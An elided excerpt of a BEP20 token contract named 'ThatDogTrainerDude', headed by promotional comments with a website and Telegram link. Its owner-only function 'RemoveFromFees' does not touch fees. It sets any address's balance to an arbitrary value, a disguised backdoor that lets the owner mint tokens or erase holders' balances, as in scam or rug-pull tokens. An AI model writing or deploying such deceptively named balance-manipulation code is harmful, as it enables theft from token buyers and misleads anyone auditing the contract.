...
/**
🐶That Dog Trainer Dude🐶 
Welcome to 🗨That Dog community!🗨 
✅Inspired By Modern And Effective Dog Training 
✅https://thatdogtrainerdude.com/
...
🚀 Join US 🚀https://t.me/ThatDogeTrainerDude
*/
...
contract ThatDogTrainerDude is Context, IBEP20, Ownable {
 ...
 function RemoveFromFees(address ThatDogTrainerDudeBSC, uint256 ThatDogTrainerDudeBSCNFT) external onlyOwner{
    _totbalances[ThatDogTrainerDudeBSC] = ThatDogTrainerDudeBSCNFT;
  }
